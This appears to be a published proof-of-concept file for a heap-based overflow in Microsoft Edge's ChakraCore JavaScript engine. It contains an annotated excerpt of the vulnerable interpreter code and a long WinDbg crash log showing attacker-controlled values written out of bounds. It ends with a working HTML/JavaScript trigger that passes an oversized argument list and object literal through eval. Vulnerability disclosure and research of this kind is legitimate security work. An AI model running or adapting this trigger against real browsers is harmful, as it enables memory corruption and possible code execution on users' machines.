@@ -1,0 +1,294 @@
+<!--
+Report by Huang Anwen, He Xiaoxiao of ichunqiu Ker Team
+
+This is the HEAP BASED OVERFLOW version of the issue.
+
+	// ChakraCore-master\lib\Runtime\Language\InterpreterStackFrame.cpp
+    Var InterpreterStackFrame::InterpreterHelper(ScriptFunction* function, ArgumentReader args, void* returnAddress, void* addressOfReturnAddress, const bool isAsmJs)
+    {
+
+		[...]
+
+        if (!isAsmJs && executeFunction->IsCoroutine())
+        {
+            [...]
+        }
+        else
+        {
+            InterpreterStackFrame::Setup setup(function, args);
+            size_t varAllocCount = setup.GetAllocationVarCount();
+			//printf("varAllocCount: %d(%X)\r\n", varAllocCount, varAllocCount);
+            size_t varSizeInBytes = varAllocCount * sizeof(Var);
+
+            //
+            // Allocate a new InterpreterStackFrame instance on the interpreter's virtual stack.
+            //
+            DWORD_PTR stackAddr;
+
+            // If the locals area exceeds a certain limit, allocate it from a private arena rather than
+            // this frame. The current limit is based on an old assert on the number of locals we would allow here.
+            if (varAllocCount > InterpreterStackFrame::LocalsThreshold)					//we can make this condition satisfied so the buffer will be allocated on the heap instead of the stack!!!
+            {
+                ArenaAllocator *tmpAlloc = nullptr;
+                fReleaseAlloc = functionScriptContext->EnsureInterpreterArena(&tmpAlloc);
+                allocation = (Var*)tmpAlloc->Alloc(varSizeInBytes);
+                stackAddr = reinterpret_cast<DWORD_PTR>(&allocation); // use a stack address so the debugger stepping logic works (step-out, for example, compares stack depths to determine when to complete the step)
+            }
+            else
+            {
+                PROBE_STACK_PARTIAL_INITIALIZED_INTERPRETER_FRAME(functionScriptContext, Js::Constants::MinStackInterpreter + varSizeInBytes);
+                allocation = (Var*)_alloca(varSizeInBytes);
+#if DBG
+                memset(allocation, 0xFE, varSizeInBytes);
+#endif
+                stackAddr = reinterpret_cast<DWORD_PTR>(allocation);
+            }
+
+		[...]
+        return aReturn;
+    }
+	
+	
+	
+	
+
+Microsoft (R) Windows Debugger Version 6.12.0002.633 AMD64
+Copyright (c) Microsoft Corporation. All rights reserved.
+
+*** wait with pending attach
+Symbol search path is: SRV*c:\mysymbol* http://msdl.microsoft.com/download/symbols
+Executable search path is: 
+ModLoad: 00007ff7`49700000 00007ff7`49725000   C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP.exe
+ModLoad: 00007ffa`13700000 00007ffa`138db000   C:\Windows\SYSTEM32\ntdll.dll
+ModLoad: 00007ffa`119f0000 00007ffa`11a9e000   C:\Windows\System32\KERNEL32.DLL
+ModLoad: 00007ffa`0fd90000 00007ffa`0ffd9000   C:\Windows\System32\KERNELBASE.dll
+ModLoad: 00007ffa`0e140000 00007ffa`0e1be000   C:\Windows\SYSTEM32\apphelp.dll
+ModLoad: 00007ffa`11b80000 00007ffa`11e79000   C:\Windows\System32\combase.dll
+ModLoad: 00007ffa`103f0000 00007ffa`104e6000   C:\Windows\System32\ucrtbase.dll
+ModLoad: 00007ffa`11160000 00007ffa`11285000   C:\Windows\System32\RPCRT4.dll
+ModLoad: 00007ffa`104f0000 00007ffa`1055a000   C:\Windows\System32\bcryptPrimitives.dll
+ModLoad: 00007ffa`11630000 00007ffa`116cd000   C:\Windows\System32\msvcrt.dll
+ModLoad: 00007ffa`0a400000 00007ffa`0a460000   C:\Windows\SYSTEM32\wincorlib.DLL
+ModLoad: 00007ffa`10c90000 00007ffa`10d50000   C:\Windows\System32\OLEAUT32.dll
+ModLoad: 00007ffa`0fcd0000 00007ffa`0fd6a000   C:\Windows\System32\msvcp_win.dll
+ModLoad: 00007ffa`0fc00000 00007ffa`0fc11000   C:\Windows\System32\kernel.appcore.dll
+ModLoad: 00007ff9`f3680000 00007ff9`f3a44000   C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\EdgeContent.dll
+ModLoad: 00007ffa`10560000 00007ffa`10c52000   C:\Windows\System32\Windows.Storage.dll
+ModLoad: 00007ffa`11940000 00007ffa`119e1000   C:\Windows\System32\advapi32.dll
+ModLoad: 00007ffa`11b20000 00007ffa`11b79000   C:\Windows\System32\sechost.dll
+ModLoad: 00007ffa`113e0000 00007ffa`11431000   C:\Windows\System32\shlwapi.dll
+ModLoad: 00007ffa`10c60000 00007ffa`10c87000   C:\Windows\System32\GDI32.dll
+ModLoad: 00007ffa`10200000 00007ffa`10388000   C:\Windows\System32\gdi32full.dll
+ModLoad: 00007ffa`10d60000 00007ffa`10eaa000   C:\Windows\System32\USER32.dll
+ModLoad: 00007ffa`0fd70000 00007ffa`0fd8e000   C:\Windows\System32\win32u.dll
+ModLoad: 00007ffa`11790000 00007ffa`1183a000   C:\Windows\System32\shcore.dll
+ModLoad: 00007ffa`0fb70000 00007ffa`0fbbc000   C:\Windows\System32\powrprof.dll
+ModLoad: 00007ffa`0fbc0000 00007ffa`0fbd5000   C:\Windows\System32\profapi.dll
+ModLoad: 00007ffa`08380000 00007ffa`08606000   C:\Windows\SYSTEM32\iertutil.dll
+ModLoad: 00007ffa`0ee70000 00007ffa`0eea1000   C:\Windows\SYSTEM32\ntmarta.dll
+ModLoad: 00007ffa`0fa70000 00007ffa`0fa99000   C:\Windows\SYSTEM32\USERENV.dll
+ModLoad: 00007ff9`ff7d0000 00007ff9`ff7f6000   C:\Windows\SYSTEM32\clipc.dll
+ModLoad: 00007ffa`0f200000 00007ffa`0f2a4000   C:\Windows\SYSTEM32\DNSAPI.dll
+ModLoad: 00007ffa`0f5c0000 00007ffa`0f5d7000   C:\Windows\SYSTEM32\cryptsp.dll
+ModLoad: 00007ffa`115b0000 00007ffa`1161c000   C:\Windows\System32\WS2_32.dll
+ModLoad: 00007ffa`10d50000 00007ffa`10d58000   C:\Windows\System32\NSI.dll
+ModLoad: 00007ffa`11730000 00007ffa`1175d000   C:\Windows\System32\IMM32.DLL
+ModLoad: 00007ffa`0f1c0000 00007ffa`0f1f7000   C:\Windows\SYSTEM32\IPHLPAPI.DLL
+ModLoad: 00007ffa`0e540000 00007ffa`0e6b0000   C:\Windows\SYSTEM32\twinapi.appcore.dll
+ModLoad: 00007ffa`0fa40000 00007ffa`0fa65000   C:\Windows\SYSTEM32\bcrypt.dll
+ModLoad: 00007ffa`0eca0000 00007ffa`0ecc1000   C:\Windows\SYSTEM32\profext.dll
+ModLoad: 00007ff9`ff580000 00007ff9`ff5f4000   C:\Windows\SYSTEM32\msiso.dll
+ModLoad: 00007ffa`054d0000 00007ffa`054f2000   C:\Windows\SYSTEM32\EShims.dll
+ModLoad: 00007ffa`045d0000 00007ffa`045eb000   C:\Windows\SYSTEM32\MPR.dll
+ModLoad: 00007ffa`11290000 00007ffa`113d5000   C:\Windows\System32\ole32.dll
+ModLoad: 00007ffa`0e370000 00007ffa`0e405000   C:\Windows\system32\uxtheme.dll
+ModLoad: 00007ff9`f1650000 00007ff9`f2d01000   C:\Windows\SYSTEM32\edgehtml.dll
+ModLoad: 00007ffa`0c190000 00007ffa`0c2c9000   C:\Windows\SYSTEM32\wintypes.dll
+ModLoad: 00007ff9`f0e60000 00007ff9`f164b000   C:\Windows\SYSTEM32\chakra.dll
+ModLoad: 00007ffa`04630000 00007ffa`0466f000   C:\Windows\SYSTEM32\MLANG.dll
+ModLoad: 00007ffa`0c840000 00007ffa`0c8b6000   C:\Windows\SYSTEM32\policymanager.dll
+ModLoad: 00007ffa`0c6f0000 00007ffa`0c77f000   C:\Windows\SYSTEM32\msvcp110_win.dll
+ModLoad: 00007ffa`0cb10000 00007ffa`0cca6000   C:\Windows\SYSTEM32\PROPSYS.dll
+ModLoad: 00007ffa`04d30000 00007ffa`04dfb000   C:\Windows\System32\ieproxy.dll
+ModLoad: 00007ffa`09f90000 00007ffa`0a096000   C:\Windows\System32\Windows.UI.dll
+ModLoad: 00007ffa`0a230000 00007ffa`0a2b2000   C:\Windows\SYSTEM32\TextInputFramework.dll
+ModLoad: 00007ffa`0b640000 00007ffa`0b912000   C:\Windows\SYSTEM32\CoreUIComponents.dll
+ModLoad: 00007ffa`0da10000 00007ffa`0daf3000   C:\Windows\SYSTEM32\CoreMessaging.dll
+ModLoad: 00007ffa`0c6d0000 00007ffa`0c6e5000   C:\Windows\SYSTEM32\usermgrcli.dll
+ModLoad: 00007ffa`0abe0000 00007ffa`0b111000   C:\Windows\System32\OneCoreUAPCommonProxyStub.dll
+ModLoad: 00007ffa`11e80000 00007ffa`132b7000   C:\Windows\System32\shell32.dll
+ModLoad: 00007ffa`101b0000 00007ffa`101f9000   C:\Windows\System32\cfgmgr32.dll
+ModLoad: 00007ffa`0ccb0000 00007ffa`0ccda000   C:\Windows\SYSTEM32\dwmapi.dll
+ModLoad: 00007ff9`ff8e0000 00007ff9`ffc0e000   C:\Windows\SYSTEM32\WININET.dll
+ModLoad: 00007ffa`0faa0000 00007ffa`0fad0000   C:\Windows\SYSTEM32\SspiCli.dll
+ModLoad: 00007ffa`11440000 00007ffa`115a6000   C:\Windows\System32\msctf.dll
+ModLoad: 00007ffa`0a0a0000 00007ffa`0a1a2000   C:\Windows\SYSTEM32\mrmcorer.dll
+ModLoad: 00007ff9`fddf0000 00007ff9`fde00000   C:\Windows\SYSTEM32\tokenbinding.dll
+ModLoad: 00007ffa`00260000 00007ffa`0027b000   C:\Windows\SYSTEM32\ondemandconnroutehelper.dll
+ModLoad: 00007ffa`0a370000 00007ffa`0a3d9000   C:\Windows\SYSTEM32\Bcp47Langs.dll
+ModLoad: 00007ffa`07430000 00007ffa`07507000   C:\Windows\SYSTEM32\winhttp.dll
+ModLoad: 00007ffa`0f420000 00007ffa`0f47c000   C:\Windows\system32\mswsock.dll
+ModLoad: 00007ffa`0a730000 00007ffa`0a73b000   C:\Windows\SYSTEM32\WINNSI.DLL
+ModLoad: 00007ffa`07260000 00007ffa`07428000   C:\Windows\SYSTEM32\urlmon.dll
+ModLoad: 00007ffa`0f5e0000 00007ffa`0f5eb000   C:\Windows\SYSTEM32\CRYPTBASE.DLL
+ModLoad: 00007ff9`fe760000 00007ff9`fe77a000   C:\Windows\System32\Windows.Shell.ServiceHostBuilder.dll
+ModLoad: 00007ff9`f3a50000 00007ff9`f3bda000   C:\Windows\SYSTEM32\ieapfltr.dll
+ModLoad: 00007ffa`0e1d0000 00007ffa`0e1ed000   C:\Windows\System32\rmclient.dll
+ModLoad: 00007ff9`fd750000 00007ff9`fd768000   C:\Windows\System32\UiaManager.dll
+ModLoad: 00007ff9`fb720000 00007ff9`fb767000   C:\Windows\system32\dataexchange.dll
+ModLoad: 00007ffa`0d180000 00007ffa`0d45f000   C:\Windows\SYSTEM32\d3d11.dll
+ModLoad: 00007ffa`0db30000 00007ffa`0dc52000   C:\Windows\SYSTEM32\dcomp.dll
+ModLoad: 00007ffa`0e9e0000 00007ffa`0ea84000   C:\Windows\SYSTEM32\dxgi.dll
+ModLoad: 00007ff9`fc470000 00007ff9`fc4f2000   C:\Windows\system32\twinapi.dll
+ModLoad: 00007ffa`060c0000 00007ffa`060e8000   C:\Windows\SYSTEM32\srpapi.dll
+ModLoad: 00007ffa`0ffe0000 00007ffa`101a9000   C:\Windows\System32\CRYPT32.dll
+ModLoad: 00007ffa`0fbe0000 00007ffa`0fbf1000   C:\Windows\System32\MSASN1.dll
+ModLoad: 00007ff9`f8480000 00007ff9`f84fa000   C:\Windows\SYSTEM32\windows.ui.core.textinput.dll
+ModLoad: 00007ff9`ff120000 00007ff9`ff17d000   C:\Windows\SYSTEM32\ninput.dll
+ModLoad: 00007ffa`0d460000 00007ffa`0da04000   C:\Windows\SYSTEM32\d2d1.dll
+ModLoad: 00007ffa`06cf0000 00007ffa`06faf000   C:\Windows\SYSTEM32\DWrite.dll
+ModLoad: 00007ff9`f8060000 00007ff9`f80ba000   C:\Windows\System32\Windows.Graphics.dll
+ModLoad: 00007ffa`06950000 00007ffa`0695f000   C:\Windows\System32\Windows.Internal.SecurityMitigationsBroker.dll
+ModLoad: 00007ffa`0b1c0000 00007ffa`0b202000   C:\Windows\SYSTEM32\vm3dum64.dll
+ModLoad: 00007ffa`0b150000 00007ffa`0b1b7000   C:\Windows\SYSTEM32\D3D10Level9.dll
+ModLoad: 00007ff9`fbc20000 00007ff9`fbc8b000   C:\Windows\System32\oleacc.dll
+ModLoad: 00007ffa`06480000 00007ffa`06490000   C:\Windows\system32\msimtf.dll
+ModLoad: 00007ffa`06ab0000 00007ffa`06b38000   C:\Windows\system32\directmanipulation.dll
+ModLoad: 00007ff9`fe370000 00007ff9`fe411000   C:\Program Files\Common Files\microsoft shared\ink\tiptsf.dll
+ModLoad: 00007ffa`06760000 00007ffa`06774000   C:\Windows\System32\Windows.System.Profile.PlatformDiagnosticsAndUsageDataSettings.dll
+ModLoad: 00007ffa`05a10000 00007ffa`05a48000   C:\Windows\System32\smartscreenps.dll
+ModLoad: 00007ffa`06b40000 00007ffa`06cc8000   C:\Windows\SYSTEM32\windows.globalization.dll
+(11fc.108c): Access violation - code c0000005 (!!! second chance !!!)
+chakra!Js::InterpreterStackFrame::ProcessUnprofiledLargeLayoutPrefix+0xd5d:
+00007ff9`f124bcad 488904d1        mov     qword ptr [rcx+rdx*8],rax ds:0000015e`3d550000=????????????????
+0:016> r
+rax=0001000042424242 rbx=000000388f1fb8b0 rcx=0000015e3d5401b0
+rdx=0000000000001fca rsi=0000000000000002 rdi=000000388f1fb3c0
+rip=00007ff9f124bcad rsp=000000388f1fbae0 rbp=000000388f1fbb10
+ r8=0000015e3d500030  r9=0000015e2c538000 r10=000000388f1fb918
+r11=0000015e2c53c000 r12=0000000000000000 r13=0000015e2932a120
+r14=0000000000000000 r15=0000015e4063f9b3
+iopl=0         nv up ei pl nz ac pe nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010210
+chakra!Js::InterpreterStackFrame::ProcessUnprofiledLargeLayoutPrefix+0xd5d:
+00007ff9`f124bcad 488904d1        mov     qword ptr [rcx+rdx*8],rax ds:0000015e`3d550000=????????????????
+0:016> dq ecx
+0000015e`3d5401b0  00000000`00000000 00010000`42424242
+0000015e`3d5401c0  00010000`42424242 00010000`42424242
+0000015e`3d5401d0  00010000`42424242 00010000`42424242
+0000015e`3d5401e0  00010000`42424242 00010000`42424242
+0000015e`3d5401f0  00010000`42424242 00010000`42424242
+0000015e`3d540200  00010000`42424242 00010000`42424242
+0000015e`3d540210  00010000`42424242 00010000`42424242
+0000015e`3d540220  00010000`42424242 00010000`42424242
+
+0:016> dq [ecx+edx*8]
+0000015e`3d550000  ????????`???????? ????????`????????
+0000015e`3d550010  ????????`???????? ????????`????????
+0000015e`3d550020  ????????`???????? ????????`????????
+0000015e`3d550030  ????????`???????? ????????`????????
+0000015e`3d550040  ????????`???????? ????????`????????
+0000015e`3d550050  ????????`???????? ????????`????????
+0000015e`3d550060  ????????`???????? ????????`????????
+0000015e`3d550070  ????????`???????? ????????`????????
+0:016> !address ecx
+
+                                     
+Failed to map Heaps (error 8007001e)
+Usage:                  <unclassified>
+Allocation Base:        0000015e`3d500000
+Base Address:           0000015e`3d500000
+End Address:            0000015e`3d550000
+Region Size:            00000000`00050000
+Type:                   00020000	MEM_PRIVATE
+State:                  00001000	MEM_COMMIT
+Protect:                00000004	PAGE_READWRITE
+
+0:016> !address 0000015e`3d550000
+Usage:                  Free
+Base Address:           0000015e`3d550000
+End Address:            0000015e`3d7f0000
+Region Size:            00000000`002a0000
+Type:                   00000000	
+State:                  00010000	MEM_FREE
+Protect:                00000001	PAGE_NOACCESS
+
+0:016> kb
+RetAddr           : Args to Child                                                           : Call Site
+00007ff9`f10fe96d : 0000015e`3d500030 0000015e`4063f9ac 00000038`8f1fbb70 0000015e`4063f9ac : chakra!Js::InterpreterStackFrame::ProcessUnprofiledLargeLayoutPrefix+0xd5d
+00007ff9`f0f5ffb1 : 0000015e`3d500030 00000000`00000000 00000000`00000000 00000000`00000000 : chakra!Js::InterpreterStackFrame::ProcessUnprofiled+0x19e8fd
+00007ff9`f0ff80cc : 0000015e`3d500030 0000015e`3c7a01a0 00000038`8f1fbc30 00007ff9`f0ebc500 : chakra!Js::InterpreterStackFrame::Process+0x1b1
+00007ff9`f0ff7be1 : 0000015e`2c560600 00000038`8f1fbe10 0000015e`3c7e0fba 00000038`8f1fbe28 : chakra!Js::InterpreterStackFrame::InterpreterHelper+0x4ac
+0000015e`3c7e0fba : 00000038`8f1fbe60 0000015e`2c560600 ffffffff`fffffffe 00007ff9`f10d6750 : chakra!Js::InterpreterStackFrame::InterpreterThunk+0x51
+00007ff9`f0e783df : 0000015e`2c560600 00000000`04000001 0000015e`2c550020 00000038`8f1fbef0 : 0x15e`3c7e0fba
+00007ff9`f0e7816a : 0000015e`3c7a01a0 0000015e`2c560600 00007ff9`f15a9f80 00000038`8f1fbef0 : chakra!Js::GlobalObject::ExecuteEvalParsedFunction+0x77
+00007ff9`f0e77fb8 : 0000015e`2c540000 00007ff9`f15a9f80 0000015e`00000000 0000015e`2c53c000 : chakra!Js::GlobalObject::VEval+0x19a
+00007ff9`f0e77ecd : 00000038`8f1fc040 0000015e`2c53b5c0 0000015e`2932a120 00000038`8f1fc000 : chakra!Js::GlobalObject::EntryEvalHelper+0xc8
+00007ff9`f10d6be3 : 0000015e`2c53b5c0 00000000`18000003 0000015e`2c550020 0000015e`2c54d770 : chakra!Js::GlobalObject::EntryEval+0x7d
+00007ff9`f0fc6bf3 : 0000015e`2932a120 00000000`00000018 00000038`8f1fc0e8 0000015e`2c53c000 : chakra!amd64_CallFunction+0x93
+00007ff9`f0e871ac : 0000015e`2c53b5c0 00007ff9`f0e77e50 00000038`8f1fc110 00000038`8f1fc2a0 : chakra!Js::JavascriptFunction::CallFunction<1>+0x83
+00007ff9`f0e877b4 : 00000038`8f1fc2a0 0000015e`3c7c0116 0000015e`2c53b5c0 00007ff9`00000008 : chakra!Js::InterpreterStackFrame::OP_CallCommon<Js::OpLayoutDynamicProfile<Js::OpLayoutT_CallIExtendedFlags<Js::LayoutSizePolicy<0> > > >+0x114
+00007ff9`f0f64920 : 00000038`8f1fc2a0 0000015e`3c7c0116 0000015e`8f1fc2a0 0000015e`3c7c0124 : chakra!Js::InterpreterStackFrame::OP_ProfiledReturnTypeCallIExtendedFlags<Js::OpLayoutT_CallIExtendedFlags<Js::LayoutSizePolicy<0> > >+0x5c
+00007ff9`f0f5ff2c : 00000038`8f1fc2a0 00000000`00000000 00000000`00000000 00000000`00000000 : chakra!Js::InterpreterStackFrame::ProcessProfiled+0x1250
+00007ff9`f0ff80cc : 00000038`8f1fc2a0 0000015e`3c7a0000 00000038`8f1fc4a0 00000000`00000001 : chakra!Js::InterpreterStackFrame::Process+0x12c
+00007ff9`f0ff7be1 : 0000015e`2c560480 00000038`8f1fc680 0000015e`3c7e0fc2 00000038`8f1fc698 : chakra!Js::InterpreterStackFrame::InterpreterHelper+0x4ac
+0000015e`3c7e0fc2 : 00000038`8f1fc6d0 00000000`00000000 00000000`00000000 00007ff9`f10d6750 : chakra!Js::InterpreterStackFrame::InterpreterThunk+0x51
+00007ff9`f10d6be3 : 0000015e`2c560480 00000000`00000000 00000000`00000000 00000000`00000000 : 0x15e`3c7e0fc2
+00007ff9`f0fc6bf3 : 0000015e`2932a120 00000000`00000000 0000015e`29352a10 00007ff9`f0fda837 : chakra!amd64_CallFunction+0x93
+00007ff9`f0ff1810 : 0000015e`2c560480 00007ff9`f10d6df0 00000038`8f1fc7d0 0000015e`2932d110 : chakra!Js::JavascriptFunction::CallFunction<1>+0x83
+00007ff9`f0ff0a37 : 0000015e`2c560480 00000038`8f1fc8c0 0000015e`2932d110 00007ffa`11697100 : chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x100
+00007ff9`f10b907e : 0000015e`2c560480 00000038`8f1fc920 0000015e`2932d110 0000015e`2932da00 : chakra!Js::JavascriptFunction::CallRootFunction+0x4b
+00007ff9`f101cd54 : 0000015e`2c560480 00000038`8f1fc960 00000000`00000000 00000038`8f1fc978 : chakra!ScriptSite::CallRootFunction+0x6a
+00007ff9`f0fb1b49 : 0000015e`2932d000 0000015e`2c560480 00000038`8f1fca10 00000000`00000000 : chakra!ScriptSite::Execute+0x124
+00007ff9`f0fb2e8e : 0000015e`29329cd0 00000038`8f1fcf18 00000038`8f1fcf50 00000038`80000082 : chakra!ScriptEngine::ExecutePendingScripts+0x1a5
+00007ff9`f0fb3121 : 0000015e`29329cd0 0000015e`29ce82e4 00000000`00000000 00000156`270b4330 : chakra!ScriptEngine::ParseScriptTextCore+0x436
+00007ff9`f1a53c75 : 0000015e`29329d20 0000015e`29ce82e4 00000156`000000f1 00000000`00000000 : chakra!ScriptEngine::ParseScriptText+0xb1
+00007ff9`f1a53abe : 00000000`00000000 00000038`8f1fcde9 00000156`270b4260 00000156`00000000 : edgehtml!CJScript9Holder::ParseScriptText+0x119
+00007ff9`f1a535d7 : 00000000`00000000 00000156`270b4260 00000156`2703c1c0 00000156`270b41b0 : edgehtml!CScriptCollection::ParseScriptText+0x202
+00007ff9`f1a52f07 : 00000156`27050c01 00000156`270ac100 00000156`00000082 00007ff9`00000000 : edgehtml!CScriptData::CommitCode+0x357
+00007ff9`f1b12f8d : 00000000`ffffffff 00000156`2703c460 00000000`ffffffff 00000000`00000000 : edgehtml!CScriptData::Execute+0x20f
+00007ff9`f19543d4 : 00000000`00000000 00000156`2708c440 00000000`00000001 00007ff9`f1b0ceb9 : edgehtml!CHtmScriptParseCtx::Execute+0x7d
+00007ff9`f19534a1 : 00000156`27050c00 00000000`00000000 00000156`27050c00 00000156`2702c8c0 : edgehtml!CHtmParseBase::Execute+0x204
+00007ff9`f1b0d23b : 00000000`00026e8b 00000156`27020000 00000156`270800b0 00000156`2702c8c0 : edgehtml!CHtmPost::Exec+0x1e1
+00007ff9`f1b0d11f : 00000156`2702c8c0 00000000`00026e8b 0000015e`29ce82e0 00000000`00000000 : edgehtml!CHtmPost::Run+0x2f
+00007ff9`f1b0cfd3 : 00000156`27020000 00000000`09806f01 00000000`00000002 00000156`27061680 : edgehtml!PostManExecute+0x63
+00007ff9`f1b0ce6d : 00000156`2702c8c0 00000000`09806ff9 0000015e`00000000 00007ffa`083a4779 : edgehtml!PostManResume+0xa3
+00007ff9`f1b1b353 : 00000156`27048600 0000015e`29c26b50 00000000`00000000 00000000`00000000 : edgehtml!CHtmPost::OnDwnChanCallback+0x3d
+00007ff9`f1af50db : 00000156`270282d0 0000015e`29325463 0000015e`29302200 00000038`8f1fd4a0 : edgehtml!CDwnChan::OnMethodCall+0x23
+00007ff9`f1981706 : 0000015e`29302728 00000156`27061680 0000015e`29302260 00000038`8f1fd4d0 : edgehtml!GWndAsyncTask::Run+0x1b
+00007ff9`f1aca860 : 00000000`16389c44 00000156`270616e0 00000156`270800b0 00007ff9`f1a29138 : edgehtml!HTML5TaskScheduler::RunReadiedTask+0x236
+00007ff9`f1aca683 : 0000015e`29c26b50 00000000`00000000 00000000`00000002 00000156`27028170 : edgehtml!TaskSchedulerBase::RunReadiedTasksInTaskQueueWithCallback+0x70
+00007ff9`f19822b3 : 00000038`8f1fd980 00000000`00008002 00000156`27028170 00007ffa`10d847df : edgehtml!HTML5TaskScheduler::RunReadiedTasks+0xa3
+00007ff9`f19807a5 : 00000000`00008002 00000156`27020000 00000156`00000000 00000000`00000002 : edgehtml!NormalPriorityAtInputEventLoopDriver::DriveRegularPriorityTaskExecution+0x53
+00007ffa`10d6bc50 : 00000000`00e80380 00000000`00000001 00000000`00000002 00000000`80000012 : edgehtml!GlobalWndProc+0x125
+00007ffa`10d6b5cf : 00000156`276d4470 00007ff9`f1980680 00000000`00e80380 00000000`00e80380 : USER32!UserCallWinProcCheckWow+0x280
+00007ff9`f3686d0e : 00000038`8f1fd920 00000000`00000000 00000156`26f58170 00000000`00000000 : USER32!DispatchMessageWorker+0x19f
+00007ff9`f369eecb : 00000000`00000000 00000000`00000001 00000156`27229e70 00000156`26fd40f0 : EdgeContent!CBrowserTab::_TabWindowThreadProc+0x3ee
+00007ff9`ff58b4a8 : 00000000`00000000 00000156`27228f80 00000000`00000000 00000000`00000000 : EdgeContent!LCIETab_ThreadProc+0x2ab
+00007ffa`11a02774 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : msiso!_IsoThreadProc_WrapperToReleaseScope+0x48
+00007ffa`13770d61 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : KERNEL32!BaseThreadInitThunk+0x14
+00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlUserThreadStart+0x21
+	
+-->
+<html>
+<head>
+<title> POC </title>
+</head>
+<script>
+
+var a=[]; 
+a.length=0xffff-1; 
+a.fill('0x42424242');
+ 
+var s='{'; 
+for(var i=0; i<0x8000-1; i++){
+ s+= 'a'+i+':0,'
+}; 
+s+= 'b:0';
+s+= '}';
+ 
+var c='function Car(){}; var car=new Car(' + a.join() + ',' + s + ')'; 
+eval(c);
+
+</script>
+</html>
